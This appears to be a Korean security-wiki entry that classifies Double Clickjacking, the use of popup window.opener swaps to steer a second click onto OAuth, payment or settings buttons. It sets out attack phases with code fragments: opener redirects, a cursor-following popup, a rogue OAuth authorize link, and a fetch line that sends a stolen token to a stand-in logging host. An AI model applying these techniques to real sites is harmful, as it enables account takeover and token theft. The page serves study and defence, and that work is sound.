---
title: Double Clickjacking
description: 
published: true
date: 2025-07-31T15:31:07.218Z
tags: vulnerability identification, social engineering camouflage, window.opener hijacking, attack success validation, data exfiltration, framing bypass, cursorjacking, invisible layering, session hijacking, authorization bypass, real‑time positional validation
editor: markdown
dateCreated: 2025-07-22T16:39:54.747Z
---

# Double Clickjacking

## 개요

“Double Clickjacking”은 사용자가 연속된 클릭 동작을 수행하도록 유도해, 두 번의 클릭 중 하나는 피싱 UI 또는 공격자가 의도한 프레임에 전달되도록 만드는 취약점이다. 공격자는 시각적으로 정당한 UI 위에 투명한 클릭 대상 요소를 겹쳐 배치하거나, 사용자 입력 타이밍을 조작하여 클릭 이벤트를 서로 다른 DOM 컨텍스트에 순차적으로 전달되도록 만든다. 이를 통해 사용자는 의도하지 않은 기능 실행이나 권한 부여를 수행하게 되며, 결과적으로 결제 승인, 설정 변경, 계정 연동 등의 동작을 공격자가 간접적으로 제어할 수 있다.

## 분류

> 인지 맥락 불일치 (Perceptual Context Gap)
> → 시각적 표현 불일치 (Visual Representation Mismatch)
> → Double Clickjacking

## 절차

| Phase          | Description                                                                                                                                             |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Reconnaissance | 대상 사이트(OAuth 승인, 결제, 계정 삭제 등 민감한 클릭 UI)를 찾고 버튼 좌표, 창 크기, URL 등을 수집한다. 또한, 사이트가 X-Frame-Options, CSP Frame-ancestors, SameSite=Lax/Strict 를 쓰는지 확인한다.    |
| Bypass         | 전통적 clickjacking 방어를 우회하기 위해 새 창(window\.open) + window\.opener.location 전환 기법을 사용하여 프레임이 아닌 동일 사이트 컨텍스트에서 동작하기 때문에 X-Frame, CSP, SameSite를 모두 무력화 시킨다. |
| Obfuscation    | 피싱 페이지에 미끼 버튼을 삽입하고, 새 창을 “CAPTCHA”, “보안 확인” 등으로 위장하여 사용자를 안심시킨다.                                                                                       |
| Injection      | 사용자의 첫 클릭(mousedown)으로 열린 위장된 창이 즉시 opener.location을 타깃 페이지로 바꾼다. 미리 측정해 둔 좌표해 민감한 버튼이 노출되도록 설정한다.                                                      |
| Exploitation   | 두 번째 클릭 시 위장 창은 스스로 닫히고, 커서는 그대로 부모 창의 실제 민감 버튼에 있어 실행이 완료되면 권한 위임, 트랜잭션 승인 등이 발생한다.                                                                    |
| Validation     | 권한(토큰) 발급 여부, URL 파라미터, 이벤트 핸들러 실행 결과 등으로 성공 여부를 확인한다.                                                                                                  |
| Exfiltration   | 획득한 액세스 토큰/세션으로 API 호출, 데이터 다운로드, 권한 남용 등 후속 행위를 수행한다.                                                                                                  |

<div style="text-align: left;">
  <img
    src="/double_clickjacking.png"
    alt="Double Clickjacking 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Target Profiling</td>
      <td>
        <pre><code>X-Frame-Options: (not set)</code></pre>
      </td>
      <td>민감한 기능(OAuth 승인, 결제, 계정 삭제 등)이 포함된 UI를 식별하고, X-Frame-Options나 CSP frame-ancestors와 같은 프레이밍 방어 메커니즘이 적용되어 있는지 확인하여 공격 가능성을 분석한다.</td>
      <td>[1], [2]</td>
    </tr>
  </tbody>
</table>

### Bypass

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Window.opener Swap</td>
      <td>
        <pre><code>window.opener.location = "target.com"</code></pre>
      </td>
      <td>첫번째 클릭 전/중 (Attacker Context): 첫 클릭으로 열린 팝업 창은 공격자가 제어하는 도메인의 콘텐츠를 표시한다.<br>두번째 클릭 시 (Victim Context): 팝업 창의 window.opener.location 속성을 조작하여 부모 창을 X-Frame-Options 등의 방어를 우회하여 민감한 페이지로 변경한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Obfuscation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Fake CAPTCHA Prompt</td>
      <td>가짜 체크박스 UI</td>
      <td>첫번째 클릭 전/중 (Attacker Context): 오버레이 페이지에 '로봇이 아닙니다' 체크박스를 표시하여 사용자가 의심 없이 클릭하도록 유도한다.<br>두번째 클릭 시 (Victim Context): 사용자는 CAPTCHA를 해결한다고 믿지만, 실제로는 민감한 버튼을 클릭하게 된다.</td>
      <td>[2]</td>
    </tr>
    <tr>
      <td>Repetitive-Click Game Interface</td>
      <td>Flappy Bird 스타일 게임 UI</td>
      <td>첫번째 클릭 전/중 (Attacker Context): 게임 인터페이스로 반복 클릭을 자연스럽게 유도한다.<br>두번째 클릭 시 (Victim Context): 사용자는 게임을 플레이한다고 믿지만, 실제로는 민감 버튼이 클릭된다.</td>
      <td>[3]</td>
    </tr>
    <tr>
      <td>Dynamic Cursor-Following Popup</td>
      <td>
        <pre><code>window.moveTo(cursorX, cursorY)</code></pre>
      </td>
      <td>첫번째 클릭 전/중 (Attacker Context): 팝업 창이 실시간으로 커서 아래로 위치하도록 조작한다.<br>두번째 클릭 시 (Victim Context): 팝업이 클릭을 가로채어 민감 버튼을 작동시킨다.</td>
      <td>[3]</td>
    </tr>
  </tbody>
</table>

### Injection

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Zero-delay setTimeout Redress</td>
      <td>
        <pre><code>setTimeout(()=>opener.location="target.com",1)</code></pre>
      </td>
      <td>첫번째 클릭 전/중 (Attacker Context): 클릭 직후 setTimeout을 예약한다.<br>두번째 클릭 시 (Victim Context): 예약된 함수가 실행되어 부모 창이 민감 페이지로 이동한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Hidden-iframe Reveal</td>
      <td>
        <pre><code>iframe.style.pointerEvents='auto'</code></pre>
      </td>
      <td>첫번째 클릭 전/중 (Attacker Context): 투명 iframe을 pointer-events:none으로 로드한다.<br>두번째 클릭 시 (Victim Context): pointer-events를 활성화하여 클릭을 iframe에 전달한다.</td>
      <td>[2]</td>
    </tr>
    <tr>
      <td>Precision Positioning via Scrolling</td>
      <td>id="footer" → /authorize?...#footer</td>
      <td>첫번째 클릭 전/중 (Attacker Context): URL 해시를 추가해 팝업 내 콘텐츠를 자동 스크롤시킨다.<br>두번째 클릭 시 (Victim Context): 민감 버튼이 정확히 노출되어 클릭이 전달된다.</td>
      <td>[3]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Session Hijacking</td>
      <td>
        <pre><code>&lt;button onclick="openDoubleWindow('https://target.com/oauth2/authorize?client_id=attacker',647,588.5,260,43)"&gt;Start Demo&lt;/button&gt;</code></pre>
      </td>
      <td>두 번의 클릭으로 탈취한 OAuth 토큰이나 세션 정보를 이용해, 공격자가 피해자의 계정 정보, 이메일, 클라우드 파일 등에 무단 접근한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Authorization Bypass</td>
      <td><pre><code>POST /payment amt=999</code></pre></td>
      <td>두 번째 클릭이 결제 승인, 보안 설정 변경 등 민감 기능에 전달되어 의도치 않은 동작을 유발한다.</td>
      <td>[2]</td>
    </tr>
    <tr>
      <td>Dynamic Cursor-Following Popup</td>
      <td>
        <pre><code>onmousemove = (e) =&gt; {
  const x = e.screenX - button.x - button.width/2;
  const y = e.screenY - button.y - button.height/2 - navbarHeight;
  w.moveTo(x, y);
  w.resizeTo(500, 300);
};</code></pre>
      </td>
      <td>팝업이 커서를 실시간 추적해 특정 버튼 아래로 이동, 클릭을 가로채어 악의적 동작을 실행한다.</td>
      <td>[3]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OAuth Token Receipt Verification</td>
      <td><pre><code>GET /callback?code=...</code></pre></td>
      <td>공격자의 서버에서 OAuth 제공자로부터 위와 같은 콜백 요청을 수신하는지 확인한다. 이는 피해자가 모르게 클릭한 OAuth 동의가 처리되었음을 의미한다.</td>
      <td>[1], [2]</td>
    </tr>
    <tr>
      <td>Real-time Positional Validation</td>
      <td><pre><code>window.screenX, window.screenY</code></pre></td>
      <td>팝업 창의 위치와 부모 창 렌더링 상태를 실시간으로 확인해, 민감 버튼이 커서 아래에 정확히 위치했는지 검증한다.</td>
      <td>[3]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OAuth Token Exfiltration</td>
      <td>
        <pre><code>fetch('https://example.com/log?tok='+token)</code></pre>
      </td>
      <td>획득한 OAuth 액세스 토큰이나 세션 쿠키를 공격자 제어 서버로 전송하여 지속적 접근 권한을 확보한다.</td>
      <td>[1], [2]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

* \[1] [https://www.evil.blog/2024/12/doubleclickjacking-what.html?m=1](https://www.evil.blog/2024/12/doubleclickjacking-what.html?m=1)
* \[2] [https://www.reflectiz.com/blog/doubleclickjacking/](https://www.reflectiz.com/blog/doubleclickjacking/)
* \[3] [https://jorianwoltjer.com/blog/p/research/ultimate-doubleclickjacking-poc](https://jorianwoltjer.com/blog/p/research/ultimate-doubleclickjacking-poc)

## 기타 참고문헌

* \[A] [https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
* \[B] [https://developer.mozilla.org/en-US/docs/Web/API/Window/open#security](https://developer.mozilla.org/en-US/docs/Web/API/Window/open#security)
